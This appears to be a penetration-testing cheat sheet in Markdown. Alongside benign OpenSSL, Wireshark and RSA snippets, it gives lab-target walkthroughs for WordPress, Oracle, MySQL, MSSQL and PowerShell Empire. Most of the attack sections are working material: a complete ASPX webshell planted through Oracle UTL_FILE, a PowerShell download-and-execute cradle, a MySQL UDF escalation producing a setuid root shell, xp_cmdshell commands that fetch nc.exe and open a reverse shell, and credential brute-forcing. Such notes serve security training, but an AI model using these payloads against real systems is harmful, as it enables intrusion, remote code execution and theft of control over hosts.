# WordPress
## wpscan
```
wpscan --url https://brainfuck.htb --disable-tls-checks
```
You can also bruteforce with wpscan
```
wpscan --url http://url.local --passwords passwords.txt
```

Enumerate all plugins
```
wpscan --url site.com -e ap
```

Using an API token for vulnerability data
```
wpscan --url http://10.11.1.251/wp -e ap --api-token <token> > wpscan.txt
```

## Upload Reverse Shell (Authenticated)
1. Go to plugins and click 'upload file'
2. upload a simple php reverse shell (e.g. laudanum's)
3. set up listener
4. browse to /wp-content/uploads
The plugin installation will fail but the file will be uploaded anyway

# SSL
## Check if Private Key matches Certificate

```
openssl x509 -noout in serct.crt | md5sum
openssl rsa -noout in key.key | md5sum	
```

## View CSR Entries
```
openssl req -text -noout -verify -in csr.csr
```

## View Certificate Entries
```
openssl x509 -text -noout -in crt.crt 
```

## Generate new Private Key and Certificate Signing Request (CSR)

```
openssl req -out CSR.csr -new -newkey rsa:4096 -nodes -keyout key.key
```

## Sign a CSR
```
openssl x509 -req -sha256 -days 1000 -in server.csr -signkey server.key -out server.pem
```

## Generate a self-signed Certificate

```
openssl req -x509 -sha256 -nodes -days 365 -newkey rsa:4096 -keyout key.key -out crt.crt
```

## Verify (python3 https server)
First create .pem file with .crt and .key
```
cat crt.crt key.key > pem.pem
```
Then run the following script
```python3
#!/usr/bin/python3

import http.server
import ssl

httpd = http.server.HTTPServer(('localhost',4443),
        http.server.SimpleHTTPRequestHandler)

httpd.socket = ssl.wrap_socket(httpd.socket, certfile='pem.pem', server_side=True)
httpd.serve_forever()
```
# RSA
Given: q, p, and e values for an RSA key, along with an encrypted message
The following script can be found [here](https://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e). It is using the extended eucledian algorithm for calculating the modulus inverse.

``` python
def egcd(a, b):
    x,y, u,v = 0,1, 1,0
    while a != 0:
        q, r = b//a, b%a
        m, n = x-u*q, y-v*q
        b,a, x,y, u,v = a,r, u,v, m,n
        gcd = b
    return gcd, x, y

def main():

    p = 1090660992520643446103273789680343
    q = 1162435056374824133712043309728653
    e = 65537
    ct = 299604539773691895576847697095098784338054746292313044353582078965

    # compute n
    n = p * q

    # Compute phi(n)
    phi = (p - 1) * (q - 1)

    # Compute modular inverse of e
    gcd, a, b = egcd(e, phi)
    d = a

    print( "n:  " + str(d) );

    # Decrypt ciphertext
    pt = pow(ct, d, n)
    print( "pt: " + str(pt) )

if __name__ == "__main__":
    main()
```


# WireShark
## Export Objects 
* File > Export Objects
## Filters
* ip.src ==
* ip.dst ==
* tcp.port == 22
* http.request.method == GET

# OracleDB
## nmap version scan
```
nmap -sV -p 1521 10.10.10.82 --script "oracle-tns-version"
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-06 18:00 CET
Nmap scan report for silo.htb (10.10.10.82)
Host is up (0.097s latency).

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.88 seconds
```
## nmap SID brute force
```
nmap -sV -p 1521 10.10.10.82 --script "oracle-sid-brute"
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-06 18:33 CET
Nmap scan report for silo.htb (10.10.10.82)
Host is up (0.096s latency).

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
| oracle-sid-brute: 
|_  XE

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2703.94 seconds

```

## hydra SID brute force
```
hydra -L /usr/share/metasploit-framework/data/wordlists/sid.txt -s 1521 10.10.10.82 oracle-sid
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-01-06 18:30:04
[DATA] max 16 tasks per 1 server, overall 16 tasks, 576 login tries (l:576/p:1), ~36 tries per task
[DATA] attacking oracle-sid://10.10.10.82:1521/
[1521][oracle-sid] host: 10.10.10.82   login: XE
[1521][oracle-sid] host: 10.10.10.82   login: PLSExtProc
[STATUS] 496.00 tries/min, 496 tries in 00:01h, 80 to do in 00:01h, 16 active
[1521][oracle-sid] host: 10.10.10.82   login: CLRExtProc
[1521][oracle-sid] host: 10.10.10.82
1 of 1 target successfully completed, 4 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-01-06 18:31:35
```

## odat
* see: https://book.hacktricks.xyz/pentesting/1521-1522-1529-pentesting-oracle-listener
* install odat
```
pip3 install cx_Oracle
git clone https://github.com/quentinhardy/odat.git
cd odat
```
* bruteforce credentials
```
python3 odat.py all -s 10.10.10.82 -p 1521 -d XE

[1] (10.10.10.82:1521): Is it vulnerable to TNS poisoning (CVE-2012-1675)?
[+] The target is vulnerable to a remote TNS poisoning

[2] (10.10.10.82:1521): Searching valid accounts on the XE SID

[+] Valid credentials found: scott/tiger. Continue... 
```

## Log in to Oracle DB with credentials
**install sqlplus:**
1. create /opt/oracle
2. download basic, sqlplus and sdk from [here](http://www.oracle.com/technetwork/database/features/instant-client/index-097480.html)
3. unzip
4. create symlink (adjust version number!): ```ln libclntsh.so.12.1 libclntsh.so``` and run ```ldconfig```
5. add the following to /etc/profile or .bashrc/.zshrc (adjust version number!):
```
export PATH=$PATH:/opt/oracle/instantclient_12_1
export SQLPATH=/opt/oracle/instantclient_12_1
export TNS_ADMIN=/opt/oracle/instantclient_12_1
export LD_LIBRARY_PATH=/opt/oracle/instantclient_12_1
export ORACLE_HOME=/opt/oracle/instantclient_12_1
```
6. add oracle libraries to ldconfig:
```
echo "/opt/oracle/instantclient_12_1/" >> /etc/ld.so.conf.d/99_oracle
```
7. done, now run ```sqlplus <username>/<password>@<ip_address>/<SID>;```

**oracle commands:**
* show users: ```SQL> SELECT USERNAME FROM ALL_USERS ORDER BY USERNAME;```
* show tables: ``` SELECT owner, table_name FROM all_tables;```

## get reverse shell from oracle command line
* connect to oracle DB. make sure to use 'as sysdba' if possible!
```
sqlplus scott/tiger@10.10.10.82/XE 'as sysdba';
```
* oracle command line allows to write file. see [here](http://psoug.org/snippet/UTL_FILE-file-write-to-file-example_538.htm?)
* run the following 'query' to upload an aspx webshell
```
declare
  filehandler UTL_FILE.FILE_TYPE;
begin
  filehandler := UTL_FILE.FOPEN('C:/inetpub/wwwroot', 'mfu.aspx', 'W');
  UTL_FILE.PUTF(filehandler, '<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script Language="c#" runat="server">
void Page_Load(object sender, EventArgs e)
{
}
string ExcuteCmd(string arg)
{
ProcessStartInfo psi = new ProcessStartInfo();
psi.FileName = "cmd.exe";
psi.Arguments = "/c "+arg;
psi.RedirectStandardOutput = true;
psi.UseShellExecute = false;
Process p = Process.Start(psi);
StreamReader stmrdr = p.StandardOutput;
string s = stmrdr.ReadToEnd();
stmrdr.Close();
return s;
}
void cmdExe_Click(object sender, System.EventArgs e)
{
Response.Write("<pre>");
Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));
Response.Write("</pre>");
}
</script>
<HTML>
<HEAD>
<title>awen asp.net webshell</title>
</HEAD>
<body >
<form id="cmd" method="post" runat="server">
<asp:TextBox id="txtArg" style="Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px" runat="server" Width="250px"></asp:TextBox>
<asp:Button id="testing" style="Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px" runat="server" Text="excute" OnClick="cmdExe_Click"></asp:Button>
<asp:Label id="lblText" style="Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px" runat="server">Command:</asp:Label>
</form>
</body>
</HTML>
');
  UTL_FILE.FCLOSE(filehandler);
end;     
```
* now browse to http://10.10.10.82/mfu.aspx and run commands
* setup webserver with powershell script and a listener
```
powershell "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.29:8000/shell.ps1')"
```

# PowerShell Empire
PowerShell empire is a post-exploitation agent. Empire implements the ability to run PowerShell agents without needing powershell.exe, modules ranging from keyloggers to Mimikatz, and adaptable communications to evade network detection. This is all bundled into a framework which is publicly available on GitHub.

## Installation
```
sudo git clone https://github.com/PowerShellEmpire/Empire.git
cd Empire
sudo ./setup/install.sh
```
## Sample Commands
```
listeners
uselistener http # use tab (autocompletion) to get a list of available listeners
info
set Host 10.10.10.10
execute
back
usestager windows/launcher_bat
set Listener http
execute

agents
interact <Name> 

creds
creds add domain.com user pass!
```

## Migrate to another process
```
interact XYZXYZXY
ps
psinject http 3568
agents
interact ABCABCAB
```

## Modules
```
usemodule # use tab (autocompletion) to get a list of available listeners
```

## Switch between Empire and Metasploit
```
$ msfvenom -p windows/meterpreter/reverse_http LHOST=10.10.10.10 LPORT=4444 -f exe -o exe.exe
# setup multi handler listener
Empire: SY24XF0J) > upload exe.exe
Empire: SY24XF0J) > shell dir
Empire: SY24XF0J) > shell C:\Users\user\Downloads\exe.exe

```
Other way
```
Empire: SY24XF0J) > usestager windows/launcher_bat
Empire: SY24XF0J) > set Listener http
Empire: SY24XF0J) > execute
meterpreter> upload launcher.bat
```


# MySQL
Connect remotely to mysql database
```
mysql --host=10.10.10.10 --port=1234 --user=db_user -p
```
Show privileges
```
SHOW Grants;
show variables;
```
## MySQL User Defined Functions (UDF)
See https://www.exploit-db.com/exploits/1518

Compile:
```
$ gcc -g -c raptor_udf2.c
$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

```
mysql> use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> create table foo(line blob);
Query OK, 0 rows affected (0.03 sec)

mysql> insert into foo values(load_file('/home/j0hn/raptor_udf2.so'));
Query OK, 1 row affected (0.00 sec)

mysql> select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
Query OK, 1 row affected (0.00 sec)

mysql> create function do_system returns integer soname 'raptor_udf2.so';
Query OK, 0 rows affected, 1 warning (0.00 sec)

mysql> select * from mysql.func;
+-----------+-----+----------------+----------+
| name      | ret | dl             | type     |
+-----------+-----+----------------+----------+
| do_system |   2 | raptor_udf2.so | function | 
+-----------+-----+----------------+----------+
1 row in set (0.00 sec)

mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
+------------------------------------------------------------------+
| do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash') |
+------------------------------------------------------------------+
|                                                       4294967296 | 
+------------------------------------------------------------------+
1 row in set (0.00 sec)
```

# MSSQL
## Connect to MSSQL
```
impacket-mssqlclient user:password@10.11.10.10
```
Windows:
```
impacket-mssqlclient domain.local/user:password@10.10.10.10 -windows-auth
## Reverse shell using xp_cmdshell
```
enable_xp_cmdshell
xp_cmdshell "powershell.exe wget http://192.168.119.134/nc.exe -OutFile C:\\Users\Public\nc.exe"
xp_cmdshell "C:\Users\Public\nc.exe -e cmd.exe 192.168.119.134 443
```
